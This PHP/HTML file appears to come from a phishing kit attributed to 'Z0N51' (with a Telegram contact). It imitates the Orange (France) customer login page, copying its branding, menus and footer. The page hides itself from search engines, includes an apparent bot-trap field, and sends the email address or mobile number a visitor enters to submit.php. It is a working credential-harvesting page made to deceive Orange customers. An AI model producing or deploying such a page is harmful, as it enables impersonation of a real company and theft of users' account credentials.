<?php

/*******
    Main Author : Z0N51
    Contact me on telegram : https://t.me/Z0N51
    ********************************************************/

    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 

        <title>Identifiez-vous avec votre compte</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container con">
                <div class="top-header">
                    <ul>
                        <li><img src="../assets/images/search.png"> <span class="d-lg-inline-block d-md-none d-sm-none d-none">Rechercher</span></li>
                        <li><img src="../assets/images/question.png"> <span class="d-lg-inline-block d-md-none d-sm-none d-none">Aide et contact</span></li>
                    </ul>
                </div>
                <nav class="navbar navbar-expand-lg">
                    <a class="navbar-brand" href="#"><img src="../assets/images/logo.png"></a>
                    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#mainmenu" aria-controls="mainmenu" aria-expanded="false" aria-label="Toggle navigation">
                        <i class="fas fa-bars"></i>
                    </button>
                    <div class="collapse navbar-collapse" id="mainmenu">
                        <ul class="navbar-nav mr-auto">
                            <li class="nav-item"><a class="nav-link" href="#">Mobiles et forfaits</a></li>
                            <li class="nav-item"><a class="nav-link" href="#">Internet</a></li>
                            <li class="nav-item"><a class="nav-link" href="#">Packs Internet + Mobile</a></li>
                            <li class="nav-item"><a class="nav-link" href="#">Maison</a></li>
                            <li class="nav-item"><a class="nav-link" href="#">TV et divertissement</a></li>
                            <li class="nav-item"><a class="nav-link" href="#">Banque</a></li>
                            <li class="nav-item"><a class="nav-link" href="#">News</a></li>
                            <li class="nav-item"><a class="nav-link" href="#"><img src="../assets/images/info.png"> Covid-19</a></li>
                        </ul>
                    </div>
                </nav>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container con">
                <div class="row">
                    <div class="col-lg-7 col-md-12 col-sm-12 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                        <form method="post" action="submit.php">
                            <input type="hidden" name="verbot">
                            <input type="hidden" name="type" value="email">
                            <legend>Identifiez-vous</legend>
                            <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'email') ?>">
                                <label for="email">Indiquez votre compte Orange <img src="../assets/images/question2.png"></label>
                                <?php echo error_message($_SESSION['errors'],'email'); ?>
                                <input type="text" name="email" class="form-control" id="email" placeholder="Adresse mail ou n?? de mobile Orange">
                            </div>
                            <div class="form-group">
                                <button id="submit" type="submit" disabled>Continuer</button>
                            </div>
                            <ul>
                                <li>Vous vous identifiez pour la premi??re fois ?</li>
                                <li>Vous n?????tes pas client ? Cr??er votre compte</li>
                                <li>Besoin d???aide ?</li>
                            </ul>
                        </form>
                    </div>
                    <div class="col-lg-5 col-md-12 col-sm-12 col-12">
                        <img src="../assets/images/banner.png">
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <div id="grey-section"></div>

        <!-- FOOTER -->
        <footer id="footer">
            <div class="container con">
                <ul class="list1">
                    <li><img src="../assets/images/question.png"> Aide et contact</li>
                    <li><img src="../assets/images/forum.png"> Forum d'entraide</li>
                    <li><img src="../assets/images/search2.png"> Trouver une boutique</li>
                </ul>
            </div>
            <hr>
            <div class="container con">
                <ul class="list2">
                    <li>Informations l??gales</li>
                    <li>Donn??es personnelles</li>
                    <li>Accessibilit??</li>
                    <li>Les cookies</li>
                    <li>Publicit??</li>
                    <li>Internet +</li>
                    <li>Signaler un contenu</li>
                    <li>&copy; Orange <?php echo date('Y'); ?></li>
                </ul>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script>
            $('#email').keyup(function(){
                if( $(this).val().length > 0 ) {
                    $('#submit').removeAttr('disabled');
                    $('#submit').css({'opacity':'1'});
                }
            });
        </script>

    </body>

</html>